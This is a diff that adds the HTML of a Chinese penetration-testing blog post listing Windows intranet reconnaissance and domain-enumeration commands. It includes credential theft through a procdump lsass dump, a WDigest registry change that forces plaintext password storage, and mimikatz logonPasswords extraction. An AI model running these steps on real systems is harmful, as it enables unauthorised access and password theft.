@@ -1,1 +1,311 @@
-<!doctype html><html lang=en><head><meta charset=UTF-8><meta name=viewport content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><link rel="shortcut icon" href=/static/favicon.ico><title>h4cnull&#39;s blog</title><link href=/static/css/app.c64eadfc8d3abfc9d85514dba4054813.css rel=stylesheet><meta name="generator" content="Hexo 4.2.0"></head><body><div id=app></div><script type=text/javascript src=/static/js/manifest.992b63bf2abbf3194771.js></script><script type=text/javascript src=/static/js/vendor.e12dc8c9af1f7aa12436.js></script><script type=text/javascript src=/static/js/app.bc036f9167871d39aecf.js></script></body></html>
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="收集本机信息常用基本命令​    ipconfig &#x2F;all ​    systeminfo | findstr &#x2F;B &#x2F;C:”OS Name” &#x2F;C:”OS Version”  查询操纵系统和版本，中文的操纵系统 “OS 名称”、”OS 版本”。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网-内网信息收集常用命令">
+<meta property="og:url" content="http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/index.html">
+<meta property="og:site_name" content="h4cnull&#39;s blog">
+<meta property="og:description" content="收集本机信息常用基本命令​    ipconfig &#x2F;all ​    systeminfo | findstr &#x2F;B &#x2F;C:”OS Name” &#x2F;C:”OS Version”  查询操纵系统和版本，中文的操纵系统 “OS 名称”、”OS 版本”。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-02-22T12:30:13.469Z">
+<meta property="article:modified_time" content="2020-02-22T12:35:08.448Z">
+<meta property="article:author" content="h4cnull">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>内网-内网信息收集常用命令</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/02/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0CheatSheet/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/02/22/%E5%86%85%E7%BD%91-%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&text=内网-内网信息收集常用命令" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=内网-内网信息收集常用命令" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&is_video=false&description=内网-内网信息收集常用命令" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网-内网信息收集常用命令&body=Check out this article: http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=内网-内网信息收集常用命令" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=内网-内网信息收集常用命令" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=内网-内网信息收集常用命令" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=内网-内网信息收集常用命令" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&name=内网-内网信息收集常用命令&description=&lt;h3 id=&#34;收集本机信息&#34;&gt;&lt;a href=&#34;#收集本机信息&#34; class=&#34;headerlink&#34; title=&#34;收集本机信息&#34;&gt;&lt;/a&gt;收集本机信息&lt;/h3&gt;&lt;h4 id=&#34;常用基本命令&#34;&gt;&lt;a href=&#34;#常用基本命令&#34; class=&#34;headerlink&#34; title=&#34;常用基本命令&#34;&gt;&lt;/a&gt;常用基本命令&lt;/h4&gt;&lt;p&gt;​    ipconfig /all&lt;/p&gt;
+&lt;p&gt;​    systeminfo | findstr /B /C:”OS Name” /C:”OS Version”  查询操纵系统和版本，中文的操纵系统 “OS 名称”、”OS 版本”。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&t=内网-内网信息收集常用命令" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#收集本机信息"><span class="toc-number">1.</span> <span class="toc-text">收集本机信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常用基本命令"><span class="toc-number">1.1.</span> <span class="toc-text">常用基本命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取明文密码"><span class="toc-number">1.2.</span> <span class="toc-text">获取明文密码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#探测内网存活主机"><span class="toc-number">2.</span> <span class="toc-text">探测内网存活主机</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#简单方法"><span class="toc-number">2.1.</span> <span class="toc-text">简单方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#思考"><span class="toc-number">2.2.</span> <span class="toc-text">思考</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内网端口扫描"><span class="toc-number">3.</span> <span class="toc-text">内网端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#搜集域相关的基础信息"><span class="toc-number">4.</span> <span class="toc-text">搜集域相关的基础信息</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        内网-内网信息收集常用命令
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">h4cnull's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-02-22T12:30:13.469Z" itemprop="datePublished">2020-02-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="收集本机信息"><a href="#收集本机信息" class="headerlink" title="收集本机信息"></a>收集本机信息</h3><h4 id="常用基本命令"><a href="#常用基本命令" class="headerlink" title="常用基本命令"></a>常用基本命令</h4><p>​    ipconfig /all</p>
+<p>​    systeminfo | findstr /B /C:”OS Name” /C:”OS Version”  查询操纵系统和版本，中文的操纵系统 “OS 名称”、”OS 版本”。</p>
+<a id="more"></a>
+
+<p>​    echo %PROCESSOR_ARCHITECTURE%</p>
+<p>​    wmic为WMI（Windows Management Instrumentation windows管理工具）提供一个强大的命令行接口。</p>
+<p>​    wmic service list brief 查询本机服务</p>
+<p>​    tasklist 查询进程列表，使用wmic process list brief</p>
+<p>​    wmic startup get command,caption 查看启动程序信息</p>
+<p>​    schtasks /query /fo LIST /v 查看任务计划</p>
+<p>​    net statistics workstation 查看开机时间</p>
+<p>​    net user 查看用户列表</p>
+<p>​    net user xxx /domain 查看指定用户详细信息</p>
+<p>​    whoami /all 可查看到用户SID</p>
+<p>​    net localgroup administrators 查看管理员组成员</p>
+<p>​    query user || qwinsta 查看当前在线用户</p>
+<p>​    net session 查看会话</p>
+<p>​    net share 查看本机共享资源列表</p>
+<p>​    netstat -ano 查看网络连接</p>
+<p>​    route print、arp -a 查看路由和arp缓存</p>
+<p>​    net time /domain 判断域</p>
+<p>​    …</p>
+<h4 id="获取明文密码"><a href="#获取明文密码" class="headerlink" title="获取明文密码"></a>获取明文密码</h4><p>​    利用procdump先dump出lsass进程内存，再本地利用mimikatz提取。</p>
+<pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p>​    win7测试可以dump win7上利用mimikatz获取密码成功。win10需要利用任务管理器右键进程创建转储文件，但是mimikatz获取到的是sha1，需要修改注册表让Wdigest Auth保存明文口令，并且需要用户重新登陆才会生效<br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f。</p>
+<p>​    运行mimikatz<br>​    mimikatz # privilege::debug<br>​    mimikatz # sekurlsa::minidump lsass.dmp<br>​    mimikatz # sekurlsa::logonPasswords full</p>
+<h3 id="探测内网存活主机"><a href="#探测内网存活主机" class="headerlink" title="探测内网存活主机"></a>探测内网存活主机</h3><h4 id="简单方法"><a href="#简单方法" class="headerlink" title="简单方法"></a>简单方法</h4><p>​    ping 探测存活主机 for /L %I in (1,1,254) DO @ping -w 100 -n 1 192.168.1.%I | findstr “TTL=”   #-w 100 一百毫秒</p>
+<p>​    再补充执行arp -a看看。</p>
+<p>​    …</p>
+<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>​    1.在内网做了安全防护的情况下如何探测？利用特殊协议？比如smb等等？</p>
+<h3 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h3><p>​    使用小众的扫描工具。</p>
+<p>​    使用telnet等。</p>
+<p>​    避免大量扫描。</p>
+<h3 id="搜集域相关的基础信息"><a href="#搜集域相关的基础信息" class="headerlink" title="搜集域相关的基础信息"></a>搜集域相关的基础信息</h3><p>​    net view /domain    查询域</p>
+<p>​    net view /domain:xxx   查询某域内的计算机</p>
+<p>​    net group /domain 查询域内的组</p>
+<p>​    net group “xxx”  /domain 查询组内用户</p>
+<p>​    net accounts /domain 获取密码策略</p>
+<p>​    nltest /domain_trusts 获取域信任信息</p>
+<p>​    nltest /DCLIST:hack 获取DC域控制器列表</p>
+<p>​    net user xxx /domain 获取某个用户的信息</p>
+<p>​    wmic useraccount get /all 获取域内用户的详细信息</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#收集本机信息"><span class="toc-number">1.</span> <span class="toc-text">收集本机信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常用基本命令"><span class="toc-number">1.1.</span> <span class="toc-text">常用基本命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取明文密码"><span class="toc-number">1.2.</span> <span class="toc-text">获取明文密码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#探测内网存活主机"><span class="toc-number">2.</span> <span class="toc-text">探测内网存活主机</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#简单方法"><span class="toc-number">2.1.</span> <span class="toc-text">简单方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#思考"><span class="toc-number">2.2.</span> <span class="toc-text">思考</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内网端口扫描"><span class="toc-number">3.</span> <span class="toc-text">内网端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#搜集域相关的基础信息"><span class="toc-number">4.</span> <span class="toc-text">搜集域相关的基础信息</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&text=内网-内网信息收集常用命令" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=内网-内网信息收集常用命令" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&is_video=false&description=内网-内网信息收集常用命令" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网-内网信息收集常用命令&body=Check out this article: http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=内网-内网信息收集常用命令" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=内网-内网信息收集常用命令" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=内网-内网信息收集常用命令" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=内网-内网信息收集常用命令" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&name=内网-内网信息收集常用命令&description=&lt;h3 id=&#34;收集本机信息&#34;&gt;&lt;a href=&#34;#收集本机信息&#34; class=&#34;headerlink&#34; title=&#34;收集本机信息&#34;&gt;&lt;/a&gt;收集本机信息&lt;/h3&gt;&lt;h4 id=&#34;常用基本命令&#34;&gt;&lt;a href=&#34;#常用基本命令&#34; class=&#34;headerlink&#34; title=&#34;常用基本命令&#34;&gt;&lt;/a&gt;常用基本命令&lt;/h4&gt;&lt;p&gt;​    ipconfig /all&lt;/p&gt;
+&lt;p&gt;​    systeminfo | findstr /B /C:”OS Name” /C:”OS Version”  查询操纵系统和版本，中文的操纵系统 “OS 名称”、”OS 版本”。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/child/2020/02/22/%E5%86%85%E7%BD%91-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&t=内网-内网信息收集常用命令" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 h4cnull
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
